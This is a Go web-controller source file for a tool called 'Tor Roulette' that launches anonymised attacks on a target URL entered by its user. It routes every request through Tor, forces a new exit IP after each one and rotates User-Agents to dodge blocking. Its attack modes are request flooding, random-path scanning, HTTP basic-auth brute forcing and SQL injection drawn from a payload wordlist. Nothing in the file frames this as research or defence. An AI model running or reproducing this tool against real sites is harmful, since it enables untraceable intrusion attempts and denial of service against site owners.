//  caiogore[$]gmail[&]com
//
package controllers

//
//
//
import (
	"fmt"
	"github.com/revel/revel"
	"h12.me/socks"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
)

//
//
//
type App struct {
	*revel.Controller
}

//
//  FUNCAO RELOADIP - FAZ A ROLETA GIRAR
//
func reloadip() {
	conn, err := net.Dial("tcp", "localhost:9051")
	if err != nil {
	}
	fmt.Fprintf(conn, "authenticate\r\n\r\n")
	fmt.Fprintf(conn, "signal newnym\r\n\r\n")
	return
}

//
//	FUNC GERA STRING
//
func randstring(n int) string {
	var dic = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UTC().UnixNano())
	x := make([]rune, n)
	for i := range x {
		x[i] = dic[rand.Intn(len(dic))]
	}
	t := string(x)
	return t
}

//
//  FUNCAO IPSCAN - RECEBE O ALVO
//
func (c App) Ipscan(target string, loop string, interval string, typeattack string) revel.Result {
	c.Validation.Required(target).Message("TYPE TARGET URL - LIKE THIS: HTTP://TORROULETTE.COM")
	c.Validation.MinSize(target, 5).Message("MIN: 5 CHARS")
	c.Validation.Required(loop).Message("NO REPETITIONS")
	c.Validation.MinSize(loop, 1).Message("MIN: 1 CHARS")
	c.Validation.Match(loop, regexp.MustCompile("^[0-9]")).Message("ONLY NUMBERS")
	c.Validation.Required(interval).Message("NO INTERVAL - MIN 6 seconds")
	if c.Validation.HasErrors() {
		c.Validation.Keep()
		c.FlashParams()
		return c.Redirect(App.Index)
	}
	//
	//
	//
	y, _ := strconv.Atoi(interval)
	amt := time.Duration(y)
	x, _ := strconv.Atoi(loop)
	start := time.Now()
	//
	//
	//
	if typeattack == "simple" {
		for i := 1; i <= x; i++ {
			getanony(target, "/")
			go reloadip()
			time.Sleep(time.Second * amt)
		}
	}
	//
	//
	//
	if typeattack == "scan" {
		for i := 1; i <= x; i++ {
			rand := randstring(7)
			getanony(target, string("/"+rand))
			go reloadip()
			time.Sleep(time.Second * amt)
		}
	}
	//
	//
	//
	if typeattack == "bruteforce" {
		for i := 1; i <= x; i++ {
			rand := randstring(7)
			getanonybt(target, string(rand))
			go reloadip()
			time.Sleep(time.Second * amt)
		}
	}
	//
	//
	//
	if typeattack == "sqlinjection" {
		for i := 1; i <= x; i++ {
			lines := readfile("/usr/local/go/src/torroulette/public/file/sqlinjection")
			getanony(target, string(lines))
			go reloadip()
			time.Sleep(time.Second * amt)
		}
	}
	//
	//
	//

	elapsed := time.Since(start)
	return c.Render(loop, target, elapsed)
}

//
//	FUNC READFILE - LER ARQUIVO E RETORNA UMA LINHA ALEATORIA
//
func readfile(file string) (lines string) {
	wordlist, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println("erro de leitura")
	}
	rand.Seed(time.Now().UTC().UnixNano())
	position := rand.Intn(125)
	line := strings.Split(string(wordlist), "\n")
	return line[position]
}

//
//  FUNCAO TOREXITIP WITH SOCKS - PEGA O IP DO NO DE SAIDA ATUAL
//
func torexitip() string {
	dialSocksProxy := socks.DialSocksProxy(socks.SOCKS5, "127.0.0.1:9050")
	tr := &http.Transport{Dial: dialSocksProxy}
	httpClient := &http.Client{Transport: tr}
	req, _ := http.NewRequest("GET", "http://myexternalip.com/raw", nil)
	res, err := httpClient.Do(req)
	if err != nil {
	}
	defer res.Body.Close()
	contents, err := ioutil.ReadAll(res.Body)
	if err != nil {
	}
	return string(contents)
}

//
//	FUNCAO GETANONY - REALIZA GET - RECEBE URL+PATH
//
func getanony(url string, randpath string) string {
	dialSocksProxy := socks.DialSocksProxy(socks.SOCKS5, "127.0.0.1:9050")
	tr := &http.Transport{Dial: dialSocksProxy}
	httpClient := &http.Client{Transport: tr}
	req, _ := http.NewRequest("GET", url+randpath, nil)
	iptor := torexitip()
	log.Printf("GETANONY in:  %s with address: %s", url+randpath, iptor)
	req.SetBasicAuth("user", "passwd")
	req.Header.Set("User-Agent", readfile("/usr/local/go/src/torroulette/public/file/useragents"))
	res, err := httpClient.Do(req)
	if err != nil {
		key := "1"
		return key
	}
	defer res.Body.Close()
	key := "0"
	return key
}

//
//	FUNCAO GETANONYBT - BRUTEFORCE
//
func getanonybt(url string, randpath string) string {
	dialSocksProxy := socks.DialSocksProxy(socks.SOCKS5, "127.0.0.1:9050")
	tr := &http.Transport{Dial: dialSocksProxy}
	httpClient := &http.Client{Transport: tr}
	req, _ := http.NewRequest("GET", url, nil)
	req.SetBasicAuth(randpath, randpath)
    iptor := torexitip()
	log.Printf("GETANONYBT path:  %s with address: %s", randpath, iptor)
	req.Header.Set("User-Agent", readfile("/usr/local/go/src/torroulette/public/file/useragents"))
	res, err := httpClient.Do(req)
	if err != nil {
		key := "1"
		return key
	}
	defer res.Body.Close()
	key := "0"
	return key
}
//
//  INDEX
//
func (c App) Index() revel.Result {
	msg := "Tor Roulette"
	iptor := torexitip()
	return c.Render(msg, iptor)
}
